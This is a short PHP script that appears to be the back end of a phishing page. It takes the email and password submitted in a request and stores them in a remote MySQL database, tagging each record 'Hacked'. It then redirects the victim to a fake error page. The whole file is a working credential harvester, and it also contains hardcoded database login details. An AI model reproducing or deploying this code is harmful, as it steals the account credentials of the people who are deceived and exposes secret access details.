<?php
$link = mysqli_connect("sql107.epizy.com", "epiz_26656698", "7ibFaMJslqv", "epiz_26656698_users");
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
 
// Escape user inputs for security
$email= mysqli_real_escape_string($link, $_REQUEST['email']);
$password = mysqli_real_escape_string($link, $_REQUEST['password']);
$note = mysqli_real_escape_string($link, 'Hacked');
 
// Attempt insert query execution
$sql = "INSERT INTO user (email, password, note) VALUES ('$email', '$password', '$note')";

if(mysqli_query($link, $sql)){
    echo "Verifing Please with";
} else{
    echo "ERROR: Could not able to execute $sql. " . mysqli_error($link);
}
 header ('Location: ./error/index.html');
// Close connection
mysqli_close($link);
?>